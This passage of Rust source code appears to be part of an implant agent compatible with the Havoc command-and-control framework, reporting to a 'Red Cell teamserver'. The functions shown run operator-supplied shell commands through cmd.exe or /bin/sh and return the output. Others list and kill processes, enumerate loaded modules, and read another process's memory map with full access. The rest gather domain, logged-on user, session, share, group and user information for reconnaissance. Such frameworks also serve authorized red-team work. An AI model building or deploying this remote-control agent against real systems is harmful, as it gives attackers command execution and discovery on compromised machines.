    // Response 1: COMMAND_PROC with process metadata
    // LE format: [subcmd][path bytes][pid][success][piped][verbose]
    let mut proc_payload = Vec::new();
    write_u32_le(&mut proc_payload, subcmd_raw);
    write_utf16le(&mut proc_payload, &process_path);
    write_u32_le(&mut proc_payload, pid);
    write_u32_le(&mut proc_payload, u32::from(success));
    write_u32_le(&mut proc_payload, piped);
    write_u32_le(&mut proc_payload, verbose);

    // Response 2: COMMAND_OUTPUT with captured output
    // LE format: [output bytes (UTF-8, length-prefixed)]
    let mut out_payload = Vec::new();
    write_bytes_le(&mut out_payload, &output_bytes);

    DispatchResult::MultiRespond(vec![
        Response::new(DemonCommand::CommandProc, proc_payload),
        Response::new(DemonCommand::CommandOutput, out_payload),
    ])
}

/// Execute a shell command via the platform-native shell and return
/// `(success, child_pid, captured_output)`.
///
/// On **Windows** the command is dispatched through `cmd.exe /c <shell_cmd>`,
/// matching the wire format sent by the Havoc operator console.
///
/// On **Unix** (Linux / macOS — used in CI and cross-compile test builds) the
/// command is translated from the Windows `cmd.exe /c` style and run via
/// `/bin/sh -c`.
#[cfg(windows)]
fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
    // Extract the bare shell command from the `/c <cmd>` style the Havoc client sends.
    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
    info!(shell_cmd = %shell_cmd, "running via cmd.exe /c");
    match SysCommand::new("cmd.exe")
        .arg("/c")
        .arg(&shell_cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => {
            let child_pid = child.id();
            let output_bytes = match child.wait_with_output() {
                Ok(o) => {
                    let mut combined = o.stdout;
                    if !o.stderr.is_empty() {
                        if !combined.is_empty() {
                            combined.push(b'\n');
                        }
                        combined.extend_from_slice(&o.stderr);
                    }
                    combined
                }
                Err(e) => {
                    warn!("ProcCreate: wait_with_output failed: {e}");
                    format!("error: {e}").into_bytes()
                }
            };
            (true, child_pid, output_bytes)
        }
        Err(e) => {
            warn!("ProcCreate: cmd.exe spawn failed: {e}");
            (false, 0u32, format!("error: {e}").into_bytes())
        }
    }
}

#[cfg(not(windows))]
fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
    // Translate Windows cmd.exe /c <cmd> style to a POSIX shell command.
    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
    info!(shell_cmd = %shell_cmd, "running via /bin/sh -c");
    match SysCommand::new("/bin/sh")
        .arg("-c")
        .arg(&shell_cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => {
            let child_pid = child.id();
            let output_bytes = match child.wait_with_output() {
                Ok(o) => {
                    let mut combined = o.stdout;
                    if !o.stderr.is_empty() {
                        if !combined.is_empty() {
                            combined.push(b'\n');
                        }
                        combined.extend_from_slice(&o.stderr);
                    }
                    combined
                }
                Err(e) => {
                    warn!("ProcCreate: wait_with_output failed: {e}");
                    format!("error: {e}").into_bytes()
                }
            };
            (true, child_pid, output_bytes)
        }
        Err(e) => {
            warn!("ProcCreate: /bin/sh spawn failed: {e}");
            (false, 0u32, format!("error: {e}").into_bytes())
        }
    }
}

/// Convert a Windows-style process invocation to a POSIX shell command string.
///
/// The Havoc `shell` client command sends `cmd.exe` as the process path and
/// `/c <command>` as the arguments.  On Linux we strip the `/c ` prefix and
/// run the remainder with `/bin/sh`.  For any other invocation we fall back to
/// running the path directly with the given arguments.
fn translate_to_shell_cmd(path: &str, args: &str) -> String {
    let args_lower = args.to_ascii_lowercase();
    if args_lower.starts_with("/c ") {
        // Typical cmd.exe /c <shell command> path
        return args[3..].to_string();
    }
    if args_lower.starts_with("/c") && args.len() > 2 {
        return args[2..].trim_start().to_string();
    }
    // Not a cmd.exe style invocation: run path with args directly.
    if args.is_empty() { path.to_string() } else { format!("{path} {args}") }
}

// ─── Internal data types ─────────────────────────────────────────────────────

/// One entry in a process list snapshot.
struct ProcessInfo {
    name: String,
    pid: u32,
    ppid: u32,
    session_id: u32,
    num_threads: u32,
    is_wow64: bool,
    user: String,
}

/// One loaded module (DLL / shared library) in a process.
struct ModuleInfo {
    /// Module file name (UTF-8 / ASCII).
    name: String,
    /// Base address of the loaded module image.
    base_addr: u64,
}

/// One result entry from a process-name grep.
struct GrepMatch {
    name: String,
    pid: u32,
    ppid: u32,
    user: String,
    /// Architecture value sent on wire: 86 = x86 (WOW64), 64 = x64 native.
    arch: u32,
}

/// Convert a WOW64 flag to the wire arch value used by the Demon protocol.
///
/// Mirrors Phantom's encoding: `is_wow64 ? 86 : 64`.
fn arch_from_wow64(is_wow64: bool) -> u32 {
    if is_wow64 { 86 } else { 64 }
}

/// One virtual-memory region from a process address-space query.
struct MemRegion {
    base_addr: u64,
    /// Region size in bytes, truncated to u32 to match Demon's `PackageAddInt32`.
    region_size: u32,
    alloc_protect: u32,
    state: u32,
    mem_type: u32,
}

// ─── Platform-specific process/memory helpers ─────────────────────────────────

// ── Windows ──────────────────────────────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
fn enum_processes() -> Vec<ProcessInfo> {
    use std::mem;
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW,
        TH32CS_SNAPPROCESS,
    };
    use windows_sys::Win32::System::Threading::{
        IsWow64Process, OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION,
    };

    let mut result = Vec::new();
    // SAFETY: CreateToolhelp32Snapshot, Process32FirstW/NextW, and CloseHandle
    // are safe to call with these arguments; PROCESSENTRY32W is zeroed before use.
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return result;
        }
        let mut entry: PROCESSENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            return result;
        }
        loop {
            let null_pos =
                entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
            let name = String::from_utf16_lossy(&entry.szExeFile[..null_pos]).to_string();

            let hproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, entry.th32ProcessID);
            let mut is_wow: i32 = 0;
            if hproc != 0 {
                IsWow64Process(hproc, &mut is_wow);
                CloseHandle(hproc);
            }

            result.push(ProcessInfo {
                name,
                pid: entry.th32ProcessID,
                ppid: entry.th32ParentProcessID,
                session_id: 0,
                num_threads: entry.cntThreads,
                is_wow64: is_wow != 0,
                user: String::new(),
            });

            if Process32NextW(snapshot, &mut entry) == 0 {
                break;
            }
        }
        CloseHandle(snapshot);
    }
    result
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn enum_modules(pid: u32) -> Vec<ModuleInfo> {
    use std::mem;
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, Module32NextW, TH32CS_SNAPMODULE,
    };

    let mut result = Vec::new();
    // SAFETY: CreateToolhelp32Snapshot, Module32FirstW/NextW, and CloseHandle
    // are safe to call with these arguments; MODULEENTRY32W is zeroed before use.
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
        if snapshot == INVALID_HANDLE_VALUE {
            return result;
        }
        let mut entry: MODULEENTRY32W = mem::zeroed();
        entry.dwSize = mem::size_of::<MODULEENTRY32W>() as u32;
        if Module32FirstW(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            return result;
        }
        loop {
            let null_pos =
                entry.szModule.iter().position(|&c| c == 0).unwrap_or(entry.szModule.len());
            let name = String::from_utf16_lossy(&entry.szModule[..null_pos]).to_string();
            let base_addr = entry.modBaseAddr as u64;
            result.push(ModuleInfo { name, base_addr });
            if Module32NextW(snapshot, &mut entry) == 0 {
                break;
            }
        }
        CloseHandle(snapshot);
    }
    result
}

#[cfg(windows)]
fn grep_processes(name_filter: &str) -> Vec<GrepMatch> {
    let filter_lower = name_filter.to_lowercase();
    enum_processes()
        .into_iter()
        .filter(|p| p.name.to_lowercase().contains(&filter_lower))
        .map(|p| GrepMatch {
            arch: arch_from_wow64(p.is_wow64),
            name: p.name,
            pid: p.pid,
            ppid: p.ppid,
            user: p.user,
        })
        .collect()
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn query_memory(pid: u32, protect_filter: u32) -> Vec<MemRegion> {
    use std::mem;
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Memory::{MEM_FREE, MEMORY_BASIC_INFORMATION, VirtualQueryEx};
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let mut result = Vec::new();
    // SAFETY: OpenProcess, VirtualQueryEx, and CloseHandle are called with
    // valid arguments; MEMORY_BASIC_INFORMATION is zeroed before use.
    unsafe {
        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if hprocess == 0 {
            return result;
        }
        let mut offset: usize = 0;
        loop {
            let mut mem_info: MEMORY_BASIC_INFORMATION = mem::zeroed();
            let bytes = VirtualQueryEx(
                hprocess,
                offset as *const _,
                &mut mem_info,
                mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );
            if bytes == 0 {
                break;
            }
            let next_addr = (mem_info.BaseAddress as usize).wrapping_add(mem_info.RegionSize);
            offset = next_addr;

            if mem_info.Type != MEM_FREE && mem_info.AllocationBase as usize != 0 {
                let add = protect_filter == 0 || protect_filter == mem_info.AllocationProtect;
                if add {
                    #[allow(clippy::cast_possible_truncation)]
                    result.push(MemRegion {
                        base_addr: mem_info.BaseAddress as u64,
                        region_size: mem_info.RegionSize as u32,
                        alloc_protect: mem_info.AllocationProtect,
                        state: mem_info.State,
                        mem_type: mem_info.Type,
                    });
                }
            }
        }
        CloseHandle(hprocess);
    }
    result
}

#[cfg(windows)]
#[allow(unsafe_code)]
fn kill_process(pid: u32) -> bool {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_TERMINATE, TerminateProcess};

    // SAFETY: OpenProcess, TerminateProcess, and CloseHandle are called with
    // valid handle values; the handle is closed before return.
    unsafe {
        let hprocess = OpenProcess(PROCESS_TERMINATE, 0, pid);
        if hprocess == 0 {
            return false;
        }
        let success = TerminateProcess(hprocess, 0) != 0;
        CloseHandle(hprocess);
        success
    }
}

// ── Linux / non-Windows ───────────────────────────────────────────────────────

#[cfg(not(windows))]
fn enum_processes() -> Vec<ProcessInfo> {
    let Ok(entries) = std::fs::read_dir("/proc") else { return Vec::new() };
    let mut result = Vec::new();
    for entry in entries.flatten() {
        let fname = entry.file_name();
        let Ok(pid) = fname.to_string_lossy().parse::<u32>() else { continue };
        let status = std::fs::read_to_string(format!("/proc/{pid}/status")).unwrap_or_default();
        let mut name = String::new();
        let mut ppid = 0u32;
        let mut threads = 0u32;
        for line in status.lines() {
            if let Some(v) = line.strip_prefix("Name:\t") {
                name = v.trim().to_string();
            } else if let Some(v) = line.strip_prefix("PPid:\t") {
                ppid = v.trim().parse().unwrap_or(0);
            } else if let Some(v) = line.strip_prefix("Threads:\t") {
                threads = v.trim().parse().unwrap_or(0);
            }
        }
        if name.is_empty() {
            continue;
        }
        result.push(ProcessInfo {
            name,
            pid,
            ppid,
            session_id: 0,
            num_threads: threads,
            is_wow64: false,
            user: String::new(),
        });
    }
    result
}

#[cfg(not(windows))]
fn enum_modules(pid: u32) -> Vec<ModuleInfo> {
    let maps_path =
        if pid == 0 { String::from("/proc/self/maps") } else { format!("/proc/{pid}/maps") };
    let Ok(content) = std::fs::read_to_string(&maps_path) else { return Vec::new() };
    let mut seen = std::collections::HashSet::new();
    let mut result = Vec::new();
    for line in content.lines() {
        let mut parts = line.splitn(6, ' ');
        let addr_range = parts.next().unwrap_or("");
        // skip perms, offset, dev, inode
        let _ = parts.next();
        let _ = parts.next();
        let _ = parts.next();
        let _ = parts.next();
        let path = parts.next().map(str::trim).unwrap_or("").trim_start();
        if path.is_empty() || (!path.ends_with(".so") && !path.contains(".so.")) {
            continue;
        }
        if !seen.insert(path.to_string()) {
            continue;
        }
        let base_addr =
            addr_range.split('-').next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
        let name = std::path::Path::new(path)
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_else(|| path.to_string());
        result.push(ModuleInfo { name, base_addr });
    }
    result
}

#[cfg(not(windows))]
fn grep_processes(name_filter: &str) -> Vec<GrepMatch> {
    let filter_lower = name_filter.to_lowercase();
    enum_processes()
        .into_iter()
        .filter(|p| p.name.to_lowercase().contains(&filter_lower))
        .map(|p| GrepMatch {
            arch: arch_from_wow64(p.is_wow64),
            name: p.name,
            pid: p.pid,
            ppid: p.ppid,
            user: p.user,
        })
        .collect()
}

#[cfg(not(windows))]
fn query_memory(pid: u32, protect_filter: u32) -> Vec<MemRegion> {
    let maps_path =
        if pid == 0 { String::from("/proc/self/maps") } else { format!("/proc/{pid}/maps") };
    let Ok(content) = std::fs::read_to_string(&maps_path) else { return Vec::new() };
    // Commit/private/mapped constants mirroring Windows MEM_* values for testing
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_PRIVATE: u32 = 0x2_0000;
    const MEM_MAPPED: u32 = 0x4_0000;
    let mut result = Vec::new();
    for line in content.lines() {
        let mut parts = line.splitn(6, ' ');
        let addr_range = parts.next().unwrap_or("");
        let perms = parts.next().unwrap_or("");
        let mut addr_iter = addr_range.split('-');
        let start = addr_iter.next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
        let end = addr_iter.next().and_then(|s| u64::from_str_radix(s, 16).ok()).unwrap_or(0);
        if end <= start {
            continue;
        }
        let perms_bytes = perms.as_bytes();
        let r = perms_bytes.first().copied() == Some(b'r');
        let w = perms_bytes.get(1).copied() == Some(b'w');
        let x = perms_bytes.get(2).copied() == Some(b'x');
        let alloc_protect: u32 = match (r, w, x) {
            (true, false, true) => 0x20,  // PAGE_EXECUTE_READ
            (true, true, true) => 0x40,   // PAGE_EXECUTE_READWRITE
            (true, true, false) => 0x04,  // PAGE_READWRITE
            (true, false, false) => 0x02, // PAGE_READONLY
            _ => 0x01,                    // PAGE_NOACCESS
        };
        if protect_filter != 0 && protect_filter != alloc_protect {
            continue;
        }
        let is_shared = perms_bytes.get(3).copied() == Some(b's');
        let mem_type = if is_shared { MEM_MAPPED } else { MEM_PRIVATE };
        #[allow(clippy::cast_possible_truncation)]
        let region_size = (end - start).min(u64::from(u32::MAX)) as u32;
        result.push(MemRegion {
            base_addr: start,
            region_size,
            alloc_protect,
            state: MEM_COMMIT,
            mem_type,
        });
    }
    result
}

#[cfg(not(windows))]
fn kill_process(pid: u32) -> bool {
    SysCommand::new("kill")
        .arg("-9")
        .arg(pid.to_string())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

// ─── COMMAND_PROC_LIST (12) ───────────────────────────────────────────────────

/// Handle a `CommandProcList` task: enumerate all running processes and return
/// the list in the wire format expected by the Red Cell teamserver.
///
/// Incoming payload (LE): `[process_ui: u32]`
///
/// Outgoing payload (LE):
/// `[process_ui: u32]` then per process:
/// `[name: utf16le][pid: u32][is_wow64: u32][ppid: u32][session: u32][threads: u32][user: utf16le]`
fn handle_proc_list(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let process_ui = parse_u32_le(payload, &mut offset).unwrap_or(0);
    let processes = enum_processes();
    let mut response = Vec::new();
    write_u32_le(&mut response, process_ui);
    for p in &processes {
        write_utf16le(&mut response, &p.name);
        write_u32_le(&mut response, p.pid);
        write_u32_le(&mut response, u32::from(p.is_wow64));
        write_u32_le(&mut response, p.ppid);
        write_u32_le(&mut response, p.session_id);
        write_u32_le(&mut response, p.num_threads);
        write_utf16le(&mut response, &p.user);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProcList, response))
}

// ─── COMMAND_PROC / Modules (2) ──────────────────────────────────────────────

/// Handle `CommandProc / Modules`: enumerate loaded modules in a process.
///
/// Incoming args (LE): `[pid: u32]` (0 = current process)
///
/// Outgoing payload (LE):
/// `[subcmd: u32][pid: u32]` then per module: `[name: bytes][base_addr: u64]`
fn handle_proc_modules(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let pid = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let modules = enum_modules(pid);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_u32_le(&mut payload, pid);
    for m in &modules {
        write_bytes_le(&mut payload, m.name.as_bytes());
        write_ptr_le(&mut payload, m.base_addr);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_PROC / Grep (3) ─────────────────────────────────────────────────

/// Handle `CommandProc / Grep`: find processes matching a name substring.
///
/// Incoming args (LE): `[name: bytes (UTF-16LE, length-prefixed)]`
///
/// Outgoing payload (LE):
/// `[subcmd: u32]` then per match:
/// `[name: utf16le][pid: u32][ppid: u32][user: utf16le][arch: u32]`
fn handle_proc_grep(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let name_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcGrep: failed to parse process name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let name = decode_utf16le_null(&name_bytes);
    let matches = grep_processes(&name);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    for m in &matches {
        write_utf16le(&mut payload, &m.name);
        write_u32_le(&mut payload, m.pid);
        write_u32_le(&mut payload, m.ppid);
        write_utf16le(&mut payload, &m.user);
        write_u32_le(&mut payload, m.arch);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_PROC / Memory (6) ───────────────────────────────────────────────

/// Handle `CommandProc / Memory`: query virtual memory regions of a process.
///
/// Incoming args (LE): `[pid: u32][protection_filter: u32]`
/// (protection_filter == 0 means return all regions)
///
/// Outgoing payload (LE):
/// `[subcmd: u32][pid: u32][protection: u32]` then per region:
/// `[base_addr: u64][region_size: u32][alloc_protect: u32][state: u32][type: u32]`
fn handle_proc_memory(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let pid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("ProcMemory: failed to parse pid: {e}");
            return DispatchResult::Ignore;
        }
    };
    let protect_filter = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let regions = query_memory(pid, protect_filter);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_u32_le(&mut payload, pid);
    write_u32_le(&mut payload, protect_filter);
    for r in &regions {
        write_ptr_le(&mut payload, r.base_addr);
        write_u32_le(&mut payload, r.region_size);
        write_u32_le(&mut payload, r.alloc_protect);
        write_u32_le(&mut payload, r.state);
        write_u32_le(&mut payload, r.mem_type);
    }
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_PROC / Kill (7) ─────────────────────────────────────────────────

/// Handle `CommandProc / Kill`: terminate a process by PID.
///
/// Incoming args (LE): `[pid: u32]`
///
/// Outgoing payload (LE): `[subcmd: u32][success: u32][pid: u32]`
fn handle_proc_kill(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let pid = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("ProcKill: failed to parse pid: {e}");
            return DispatchResult::Ignore;
        }
    };
    let success = kill_process(pid);
    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_u32_le(&mut payload, u32::from(success));
    write_u32_le(&mut payload, pid);
    DispatchResult::Respond(Response::new(DemonCommand::CommandProc, payload))
}

// ─── COMMAND_NET (2100) ─────────────────────────────────────────────────────

/// Handle a `CommandNet` task: dispatch to the appropriate network-discovery
/// subcommand handler.
///
/// Incoming payload (LE): `[subcommand: u32][...subcommand-specific fields]`
fn handle_net(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandNet: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonNetCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandNet: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandNet dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonNetCommand::Domain => handle_net_domain(),
        DemonNetCommand::Logons => handle_net_logons(rest),
        DemonNetCommand::Sessions => handle_net_sessions(rest),
        DemonNetCommand::Computer => handle_net_name_list(subcmd_raw, rest),
        DemonNetCommand::DcList => handle_net_name_list(subcmd_raw, rest),
        DemonNetCommand::Share => handle_net_share(rest),
        DemonNetCommand::LocalGroup => handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Group => handle_net_groups(subcmd_raw, rest),
        DemonNetCommand::Users => handle_net_users(rest),
    }
}

/// `DEMON_NET_COMMAND_DOMAIN` (1): return the DNS domain name of the machine.
///
/// Response payload (LE): `[1: u32][domain_string: len-prefixed bytes]`
fn handle_net_domain() -> DispatchResult {
    let domain = platform_domain_name();
    info!(domain = %domain, "NetDomain");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Domain));
    // Domain uses plain ASCII/UTF-8 string (not UTF-16), matching Havoc's PackageAddString.
    write_bytes_le(&mut payload, domain.as_bytes());

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_LOGONS` (2): enumerate logged-on users.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[2: u32][server_name: UTF-16LE][username: UTF-16LE]…`
fn handle_net_logons(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetLogons: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let users = platform_logged_on_users();
    info!(server = %server, count = users.len(), "NetLogons");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Logons));
    write_utf16le(&mut payload, &server);
    for user in &users {
        write_utf16le(&mut payload, user);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_SESSIONS` (3): enumerate active sessions.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[3: u32][server_name: UTF-16LE][client: UTF-16LE][user: UTF-16LE][time: u32][idle: u32]…`
fn handle_net_sessions(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetSessions: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let sessions = platform_sessions();
    info!(server = %server, count = sessions.len(), "NetSessions");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Sessions));
    write_utf16le(&mut payload, &server);
    for session in &sessions {
        write_utf16le(&mut payload, &session.client);
        write_utf16le(&mut payload, &session.user);
        write_u32_le(&mut payload, session.active_secs);
        write_u32_le(&mut payload, session.idle_secs);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_COMPUTER` (4) / `DEMON_NET_COMMAND_DCLIST` (5): name lists.
///
/// Computer and DcList are stubs in the original Havoc Demon. We implement the
/// wire format so the teamserver can parse a valid (possibly empty) response.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[subcmd: u32][server_name: UTF-16LE][name: UTF-16LE]…`
fn handle_net_name_list(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!(subcmd_raw, "NetNameList: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    info!(server = %server, subcmd = subcmd_raw, "NetNameList (stub)");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_utf16le(&mut payload, &server);
    // Empty list — stubs, matching original Havoc Demon behaviour.

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_SHARE` (6): enumerate network shares.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[6: u32][server_name: UTF-16LE][name: UTF-16LE][path: UTF-16LE][remark: UTF-16LE][permissions: u32]…`
fn handle_net_share(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetShare: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let shares = platform_shares();
    info!(server = %server, count = shares.len(), "NetShare");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Share));
    write_utf16le(&mut payload, &server);
    for share in &shares {
        write_utf16le(&mut payload, &share.name);
        write_utf16le(&mut payload, &share.path);
        write_utf16le(&mut payload, &share.remark);
        write_u32_le(&mut payload, share.permissions);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_LOCALGROUP` (7) / `DEMON_NET_COMMAND_GROUP` (8): group enumeration.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[subcmd: u32][server_name: UTF-16LE][name: UTF-16LE][description: UTF-16LE]…`
fn handle_net_groups(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!(subcmd_raw, "NetGroups: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let groups = platform_groups();
    info!(server = %server, count = groups.len(), subcmd = subcmd_raw, "NetGroups");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, subcmd_raw);
    write_utf16le(&mut payload, &server);
    for group in &groups {
        write_utf16le(&mut payload, &group.name);
        write_utf16le(&mut payload, &group.description);
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

/// `DEMON_NET_COMMAND_USER` (9): enumerate users on a target host.
///
/// Incoming: `[server_name: len-prefixed UTF-16LE]`
/// Response (LE): `[9: u32][server_name: UTF-16LE][username: UTF-16LE][is_admin: u32]…`
fn handle_net_users(rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let server_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("NetUsers: failed to parse server name: {e}");
            return DispatchResult::Ignore;
        }
    };
    let server = decode_utf16le_null(&server_bytes);

    let users = platform_users();
    info!(server = %server, count = users.len(), "NetUsers");

    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonNetCommand::Users));
    write_utf16le(&mut payload, &server);
    for user in &users {
        write_utf16le(&mut payload, &user.name);
        write_u32_le(&mut payload, u32::from(user.is_admin));
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandNet, payload))
}

// ─── Net data structures ────────────────────────────────────────────────────

/// An active network session entry (maps to `SESSION_INFO_10` on Windows).
struct NetSession {
    client: String,
    user: String,
    active_secs: u32,
    idle_secs: u32,
}

/// A network share entry (maps to `SHARE_INFO_502` on Windows).
struct NetShare {
    name: String,
    path: String,
    remark: String,
    permissions: u32,
}

/// A group entry with name and description.
struct NetGroup {
    name: String,
    description: String,
}

/// A user entry with an admin flag.
struct NetUser {
    name: String,
    is_admin: bool,
}

// ─── Platform data collection ───────────────────────────────────────────────
//
// These functions gather host-native data.  On Windows the real Win32 Net*
// APIs will be called (future work gated behind `#[cfg(windows)]`).  On
// Linux we use /proc, /etc/passwd, /etc/group, and utmp-style parsing so
// that the handler logic and wire format can be fully tested on CI.

/// Return the DNS domain name of this machine.
fn platform_domain_name() -> String {
    // Try /proc/sys/kernel/domainname first (Linux).
    if let Ok(raw) = std::fs::read_to_string("/proc/sys/kernel/domainname") {
        let trimmed = raw.trim();
        if !trimmed.is_empty() && trimmed != "(none)" {
            return trimmed.to_string();
        }
    }
    // Fallback: try the `hostname` command's domain part.
    if let Ok(output) =
        SysCommand::new("hostname").arg("-d").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let domain = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if !domain.is_empty() {
            return domain;
        }
    }
    String::new()
}

/// Enumerate currently logged-on users.
fn platform_logged_on_users() -> Vec<String> {
    let mut users = Vec::new();
    if let Ok(output) = SysCommand::new("who").stdout(Stdio::piped()).stderr(Stdio::null()).output()
    {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            if let Some(name) = line.split_whitespace().next() {
                if !users.contains(&name.to_string()) {
                    users.push(name.to_string());
                }
            }
        }
    }
    users
}

/// Enumerate active login sessions with timing information.
fn platform_sessions() -> Vec<NetSession> {
    let mut sessions = Vec::new();
